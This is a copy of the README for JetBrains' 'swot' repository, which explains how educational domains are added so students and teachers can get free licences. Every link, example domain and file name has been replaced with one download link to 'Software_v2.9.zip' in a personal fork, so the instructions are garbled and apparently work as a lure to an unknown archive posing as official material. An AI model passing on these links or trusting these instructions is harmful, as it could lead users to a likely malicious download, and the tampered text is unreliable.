[![official JetBrains project](https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip)](https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip+on+GitHub)
# swot

JetBrains uses this **swot** repository to grant free licenses for JetBrains tools to students and teachers worldwide. If your email is in one of the domains listed in this repository, you may request your free license from JetBrains. Visit https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip to request!
...
If you represent a primary or secondary school and you are certain of the necessity of a professional version of a JetBrains tool for your school, please contact JetBrains sales team via https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip

## How to add a domain to this repository

Adding a domain (e.g., `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip`) automatically includes all its subdomains (e.g., `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip`). Do not add subdomains separately — only the main domain is needed.

### Steps to Add a Domain: ###
1. Fork this repository. Please use a correct Fork link on GitHub
![image](https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip)
2. Create a file. Each domain is represented by a single `.txt` file in the repository. Example: to add `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip`, create the file `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip`. Files must have the `.txt` extension.
3. Write the official name of the educational organization on the first line of the file. It is recommended to use the name in the native language. For example, the file `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip` has to contain a line in it: *"Federal University of Agriculture, Abeokuta"*. Other lines may optionally contain other names the university is known by, for example the name of the school in English. For domains shared by multiple institutions (e.g., a school district), please add a word `.group` as the last line.
4. [Submit the pull request](https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip).
...
Please refer to the `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip` file in this repository to read more about the repository structure and contributing rules.

## FAQ
#### There are many domains in my university, how can I add all of them?
If all the domains used for teachers' and students' email are in the same upper-level domain, you can add the upper-level domain. For example, if there is a domain `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip` owned by a university, and there are subdomains such as `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip` and `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip`, used by the students and the teachers respectively, you can add `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip` domain only, and both students and teachers will be able to request their free licenses.
...
If the university uses several email domains in different upper-level domains (for example, `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip` and `https://raw.githubusercontent.com/razashaikh26/swot/master/lib/domains/dz/edu/Software_v2.9.zip`), please submit several files with different paths and the same content (i.e., same name of the university) in your pull request.
